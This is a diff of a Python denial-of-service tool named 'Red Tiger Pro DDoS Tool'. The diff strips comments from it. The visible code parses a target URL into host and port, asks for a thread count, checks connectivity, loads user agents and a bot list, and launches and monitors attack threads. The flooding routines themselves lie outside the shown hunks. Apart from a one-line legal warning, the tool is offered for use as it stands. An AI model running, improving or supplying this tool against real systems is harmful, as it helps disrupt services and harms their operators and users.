@@ -317,20 +317,17 @@ def my_bots():
 def extract_host_from_url(url):
     """URL-ből kinyeri a hosztnevet és portot"""
     try:
-        # Tisztítás: eltávolítjuk a http:// vagy https:// előtagot ha van
         url = url.strip()
         if url.startswith("http://"):
             url = url[7:]
         elif url.startswith("https://"):
             url = url[8:]
         
-        # Eltávolítjuk a / utáni részt
         if '/' in url:
             url = url.split('/')[0]
         
-        # Port kinyerése ha van
         host_part = url
-        port_part = 80  # alapértelmezett
+        port_part = 80
         
         if ':' in url:
             parts = url.split(':')
@@ -452,7 +449,6 @@ def get_parameters():
             print("\033[91mError: URL cannot be empty\033[0m")
             sys.exit(1)
         
-        # Kinyerjük a hosztot és portot az URL-ből
         extracted_host, extracted_port = extract_host_from_url(url)
         
         if extracted_host is None:
@@ -527,28 +523,23 @@ def main():
     print("\033[1;34;40mRed Tiger Pro DDoS Tool - Starting...\033[0m")
     print("\033[1;34;40m" + "="*60 + "\033[0m")
     
-    # Create headers file if needed
     create_headers_file()
     
-    # Get parameters through interactive menu
     host, port, thr = get_parameters()
     
     print(f"\033[92mTarget: {host}:{port}\033[0m")
     print(f"\033[92mThreads: {thr}\033[0m")
     print(f"\033[92mStarting attack at {time.ctime(time.time())}\033[0m")
     
-    # Test connection
     if not test_connection(host, port):
         continue_anyway = input("\033[93mContinue anyway? (y/n): \033[0m").strip().lower()
         if continue_anyway != 'y':
             print("\033[91mAttack cancelled\033[0m")
             sys.exit(0)
     
-    # Initialize user agents and bots
     user_agent()
     my_bots()
     
-    # Start attack threads
     threads = []
     
     print(f"\033[94mStarting {thr} attack threads...\033[0m")
@@ -567,12 +558,10 @@ def main():
     print("\033[93mWarning: Unauthorized use of this tool is illegal!\033[0m")
     
     try:
-        # Keep main thread alive
         counter = 0
         while True:
             time.sleep(1)
             counter += 1
-            # Show status every 10 seconds
             if counter % 10 == 0:
                 print(f"\033[94mAttack in progress... {time.ctime(time.time())}\033[0m")
                 print(f"\033[94mRunning for {counter} seconds\033[0m")
